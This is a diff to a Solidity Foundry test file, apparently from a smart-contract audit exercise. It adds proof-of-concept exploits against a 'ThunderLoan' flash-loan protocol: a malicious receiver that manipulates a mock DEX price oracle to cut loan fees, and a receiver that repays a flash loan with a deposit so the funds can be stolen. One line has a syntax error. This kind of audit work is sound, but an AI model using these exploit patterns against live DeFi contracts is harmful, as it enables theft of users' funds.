@@ -7,6 +7,7 @@ import { AssetToken } from "../../src/protocol/AssetToken.sol";
 import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
 import { ERC20Mock } from "../mocks/ERC20Mock.sol";
 import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
 import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
 import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
@@ -122,17 +123,19 @@ contract ThunderLoanTest is BaseTest {
     }
 
     function testOracleManipulation() public {
-        // 1. setup contracts
+        // 1. Setup contracts
         thunderLoan = new ThunderLoan();
+        weth = new ERC20Mock();
         tokenA = new ERC20Mock();
         proxy = new ERC1967Proxy(address(thunderLoan), "");
-        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(tokenA));
-        // Create a TSwap between Weth/TokenA
+        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
+
+        // 2. Create a TSwap between Weth/TokenA
         address tswapPool = pf.createPool(address(tokenA));
         thunderLoan = ThunderLoan(address(proxy));
         thunderLoan.initialize(address(pf));
 
-        // 2. Fund TSwap
+        // 3. Fund TSwap
         vm.startPrank(liquidityProvider);
         tokenA.mint(liquidityProvider, 100e18);
         tokenA.approve(address(tswapPool), 100e18);
@@ -142,20 +145,122 @@ contract ThunderLoanTest is BaseTest {
         vm.stopPrank();
         // Ratio is 1:1
 
-        // 3. Approve tokenA on ThunderLoan
+        // 4. Approve tokenA on ThunderLoan
         vm.prank(thunderLoan.owner());
         thunderLoan.setAllowedToken(tokenA, true);
 
-        // 4. Fund ThunderLoan
+        // 5. Fund ThunderLoan
         vm.startPrank(liquidityProvider);
         tokenA.mint(liquidityProvider, 1000e18);
         tokenA.approve(address(thunderLoan), 1000e18);
         thunderLoan.deposit(tokenA, 1000e18);
         vm.stopPrank();
-        //  Now we have 1000 tokenA on ThunderLoan
+        // Now we have 1000 tokenA on ThunderLoan
+        // Take out a flash loan of 50 tokenA
+        // swap it on the dex, tanking the price (150 tokenA / 66.66 weth)
+        // take out another flash loan of 50 tokenA (and we'll see how much cheaper it is!!)
 
-        // 5. We are going to take 2 flash loans
+        // 6. We are going to take 2 flash loans
         //     a. To nuke the price of the Weth/tokenA on TSwap
         //     b. To show thatdoing so greatly reduces the fees we pay on ThundeerLoan
+        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
+        console.log("Normal Fee is:", normalFeeCost); // 296147410319118389
+
+        uint256 amountToBorrow = 50e18; // we'll be use this twice
+        MaliciousFlashLoanReceiver mflr = new MaliciousFlashLoanReceiver(
+            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
+        );
+
+        vm.startPrank(user);
+        tokenA.mint(address(mflr), 100e18); // for cover the fee
+        thunderLoan.flashloan(address(mflr), tokenA, amountToBorrow, "");
+        vm.stopPrank();
+
+        uint256 attackFee = mflr.feeOne() + mflr.feeTwo();
+        console.log("Attack fee: ", attackFee);
+        assert(attackFee < normalFeeCost);
+    }
+
+    function testUseDepositInsteadOfRepayForStealFunds() public setAllowedToken hasDeposits {
+        vm.startPrank(user);
+        uint256 amountToBorrow = 50e18;
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        tokenA.mint(address(dor), fee);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+    }
+}
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        assetToken = thunderLoan.getAssetFromToken
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        return true;
+    }
+}
+
+contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    address repayAddress;
+    BuffMockTSwap pool;
+    bool attacked;
+    uint256 public feeOne;
+    uint256 public feeTwo;
+
+    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+        repayAddress = _repayAddress;
+        pool = BuffMockTSwap(_tswapPool);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        if (!attacked) {
+            // 1. Swap tokenA borrowed for weth
+            // 2. Take out another flash loan, to show the difference
+            feeOne = fee;
+            attacked = true;
+            uint256 expected = pool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
+            IERC20(token).approve(address(pool), 50e18);
+            // Tanks the price
+            pool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, expected, block.timestamp);
+            // now we call a second flash loan
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
+            // repay
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        } else {
+            // calculate the fee and repay
+            feeTwo = fee;
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        }
+        return true;
     }
 }
